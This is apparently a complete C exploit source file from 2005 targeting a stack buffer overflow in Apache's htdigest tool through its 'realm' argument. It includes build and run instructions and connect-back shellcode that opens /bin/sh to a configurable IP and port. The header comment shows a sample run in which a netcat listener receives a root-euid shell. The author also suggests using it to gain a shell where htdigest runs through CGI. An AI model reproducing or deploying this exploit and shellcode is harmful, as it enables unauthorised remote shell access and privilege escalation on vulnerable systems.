/*
 * htdigest-realm-bof.c by K-sPecial 5-11-2005 { irc://irc.xzziroz.net }
 *
 * exploit for htdigest 'realm' parameter overflow; not sure on versions, seems to be <= 1.3.27 <= 2.0.52
 * http://www.securiteam.com/unixfocus/5EP061FEKC.html
 * 
 * compile with: gcc -o htdigest-realm-bof htdigest-realm-bof.c -std=c99
 * 
 * One thing to note, apache seems to have htdigest going on quite odd, this code was written
 * for the version that the htdigest sh script links together, debian seems to install the actual binary,
 * so these might not be compatible. Also to note, this code was tested and created using the htdigest 
 * script/lt-htdigest that comes with apache 2.0.52
 *
 * kspecial@xzziroz:/usr/src/httpd-2.0.52/support$ ./htdigest -c file `./htdigest-realm-bof` user
 * Adding password for user in realm 悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙1򤋱蒕盦盦盦夅嘲f蛝壜1�1蒕Qhfh9眆Q夌砈WR夅嘲f蛝1�9羣1腊蛝1腊?売蛝1腊?売蓖�1腊?売蓖�1�1襊hn/shh//bi夈PS夅�
 *        蛝1腊蛝蔸�枯��枯��枯��枯��枯��枯��枯��枯��枯��枯��枯��枯��枯��枯��枯���.
 *        ^[[?1;2cNew password: 
 *        Re-type new password: 
 *        
 * kspecial@xzziroz:~$ nc -lvp 1337
 * listening on [any] 1337 ...
 * 127.1.1.1: inverse host lookup failed: Unknown host
 * connect to [127.1.1.1] from (UNKNOWN) [127.1.1.1] 2965
 * id
 * uid=1000(kspecial) gid=1000(kspecial) euid=0(root) groups=100(users),1000(kspecial),1002(media)
 *
 *
 * Of course the binary is not setuid by default. This ploit could be possibly useful to gain a
 * shell when htdigest is being ran through a CGI script.
*/
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>

/********************************************************************************/

#define IP "127.1.1.1"
#define PORT 1337

unsigned int addys[] = { 0xbffffadd, // debian 3.1
			};
// which address to use
#define ADDY 0

/*******************************************************************************/


// Point Of EIP - The ammount of data we must write to completely overflow eip
#define POE 395

// netric callback shellcode
char cb[] = 
	"\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
	"\x06\x51\xb1\x01\x51\xb1\x02\x51"
	"\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
	"\x89\xc2\x31\xc0\x31\xc9\x51\x51"
	"\x68\x41\x42\x43\x44\x66\x68\xb0"
	"\xef\xb1\x02\x66\x51\x89\xe7\xb3"
	"\x10\x53\x57\x52\x89\xe1\xb3\x03"
	"\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
	"\x74\x06\x31\xc0\xb0\x01\xcd\x80"
	"\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
	"\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
	"\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
	"\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
	"\x50\x68\x6e\x2f\x73\x68\x68\x2f"
	"\x2f\x62\x69\x89\xe3\x50\x53\x89"
	"\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
	"\x01\xcd\x80";

#define IP_OFFSET	33
#define PORT_OFFSET     39

void changeip(char *ip);
void changeport(char *code, int port, int offset);

int main (void) { 
	char buff[416];
	int a;

	changeip(IP);
	changeport(cb, PORT, PORT_OFFSET);
	
	for (a = 0; a < 200; a++) 
		*(buff+a) = 0x90;

	for (int b = 0; *(cb+b); a++, b++)
		*(buff+a) = *(cb+b);
	
	for (; a + 4 <= POE; a += 4)
		memcpy(buff+a, (addys+ADDY), 4);
	
	*(buff+a) = 0;

	fwrite(buff, strlen(buff), 1, stdout);
	return(0);
}
		
// ripped from some of snooq's code
void changeip(char *ip) {
        char *ptr;
        ptr=cb+IP_OFFSET;
        /* Assume Little-Endianess.... */
        *((long *)ptr)=inet_addr(ip);
}

// ripped from some of snooq's code
void changeport(char *code, int port, int offset) {
	char *ptr;
	ptr=code+offset;
	/* Assume Little-Endianess.... */
	*ptr++=(char)((port>>8)&0xff);
	*ptr++=(char)(port&0xff);
}	
	
	
	
		      
